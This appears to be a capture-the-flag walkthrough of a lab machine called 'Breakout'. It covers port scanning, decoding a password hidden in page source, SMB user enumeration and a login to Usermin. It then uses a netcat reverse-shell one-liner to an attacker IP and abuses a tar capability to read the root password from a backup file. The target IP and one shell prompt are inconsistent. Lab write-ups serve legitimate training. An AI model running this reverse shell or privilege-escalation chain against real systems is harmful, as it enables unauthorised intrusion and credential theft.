@@ -1,0 +1,140 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body><br/>
+IP - 10.0.2.17<br/>
+<br/>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+# Nmap 7.93 scan initiated Mon Jan 30 16:47:20 2023 as: nmap -sC -sV -p- -oN nmap_all_port.txt 10.0.2.17<br/>
+Nmap scan report for 10.0.2.17<br/>
+Host is up (0.00011s latency).<br/>
+Not shown: 65530 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; &nbsp;STATE SERVICE &nbsp; &nbsp; VERSION<br/>
+80/tcp &nbsp; &nbsp;open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp;Apache httpd 2.4.51 ((Debian))<br/>
+|_http-server-header: Apache/2.4.51 (Debian)<br/>
+|_http-title: Apache2 Debian Default Page: It works<br/>
+139/tcp &nbsp; open &nbsp;netbios-ssn Samba smbd 4.6.2<br/>
+445/tcp &nbsp; open &nbsp;netbios-ssn Samba smbd 4.6.2<br/>
+10000/tcp open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp;MiniServ 1.981 (Webmin httpd)<br/>
+|_http-title: 200 &amp;mdash; Document follows<br/>
+20000/tcp open &nbsp;http &nbsp; &nbsp; &nbsp; &nbsp;MiniServ 1.830 (Webmin httpd)<br/>
+|_http-title: 200 &amp;mdash; Document follows<br/>
+MAC Address: 08:00:27:3E:6F:93 (Oracle VirtualBox virtual NIC)<br/>
+<br/>
+Host script results:<br/>
+| smb2-security-mode: <br/>
+| &nbsp; 311: <br/>
+|_ &nbsp; &nbsp;Message signing enabled but not required<br/>
+|_clock-skew: 1s<br/>
+|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br/>
+| smb2-time: <br/>
+| &nbsp; date: 2023-01-30T10:17:37<br/>
+|_ &nbsp;start_date: N/A<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+# Nmap done at Mon Jan 30 16:48:05 2023 -- 1 IP address (1 host up) scanned in 45.17 seconds<br/>
+<br/>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Found brainfuck code End Of The Line:<br/>
+<br/>
+view-source:http://10.0.2.17/<br/>
+<br/>
+&lt;!--<br/>
+don't worry no one will get here, it's safe to share with you my access. Its encrypted :)<br/>
+<br/>
+++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.<br/>
+<br/>
+<br/>
+--&gt;<br/>
+<br/>
+Decrypted<br/>
+<br/>
+.2uqPEfj3D&lt;P'a-3 <br/>
+<br/>
+<br/>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Enumerating smb with enum4linux:<br/>
+<br/>
+enum4linux -a 192.168.100.53<br/>
+<br/>
+[+] Enumerating users using SID S-1-22-1 and logon username '', password '' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+S-1-22-1-1000 Unix User\cyber (Local User)<br/>
+<br/>
+Found Username - cyber<br/>
+<br/>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I logined with username cyber and password .2uqPEfj3D&lt;P'a-3 into https://192.168.100.53:20000/ (usermin)<br/>
+<br/>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I found command shell web page in here:<br/>
+<br/>
+https://192.168.100.53:20000/shell/index.cgi?xnavigation=1<br/>
+<br/>
+Execute rev shell payload:<br/>
+<br/>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.100.29 4445 &gt;/tmp/f<br/>
+<br/>
+Got reverse shell.<br/>
+<br/>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+1st Flag:<br/>
+<br/>
+root@breakout:/home/cyber# cat local.txt <br/>
+8122243dc4273b903fec7afbba393652<br/>
+<br/>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priv Escalation (Zip arbitrary file read)<br/>
+<br/>
+Reference: https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/<br/>
+<br/>
+Found old backup file at /var/backups/.old_pass.bak and tar can run at home directory<br/>
+<br/>
+so create tar achive<br/>
+<br/>
+./tar -cf root.tar /var/backups/.old_pass.bak<br/>
+<br/>
+and now we can extract as cyber<br/>
+<br/>
+./tar -xf root.tar<br/>
+<br/>
+found var directory<br/>
+<br/>
+cyber@breakout:~$ cd var<br/>
+cyber@breakout:~/var$ ls -la<br/>
+total 12<br/>
+drwxr-xr-x 3 cyber cyber 4096 Jan 30 15:27 .<br/>
+drwxr-xr-x 9 cyber cyber 4096 Jan 30 15:27 ..<br/>
+drwxr-xr-x 2 cyber cyber 4096 Jan 30 15:27 backups<br/>
+cyber@breakout:~/var$ cd backups/<br/>
+cyber@breakout:~/var/backups$ ls -al<br/>
+total 12<br/>
+drwxr-xr-x 2 cyber cyber 4096 Jan 30 15:27 .<br/>
+drwxr-xr-x 3 cyber cyber 4096 Jan 30 15:27 ..<br/>
+-rw------- 1 cyber cyber &nbsp; 17 Oct 20 &nbsp;2021 .old_pass.bak<br/>
+cyber@breakout:~/var/backups$ cat .old_pass.bak <br/>
+Ts&amp;4&amp;YurgtRX(=~h<br/>
+<br/>
+<br/>
+got root passowrd - Ts&amp;4&amp;YurgtRX(=~h<br/>
+<br/>
+cyber@breakout:~/var/backups$ su root<br/>
+Password: <br/>
+root@breakout:/home/cyber/var/backups# whoami<br/>
+root<br/>
+<br/>
+<br/>
+cyber@breakout:/tmp/etc/etc/root$ cat proof.txt <br/>
+cfe4b4d1849b418afc9149ab0008ed5f<br/>
+</body></html>
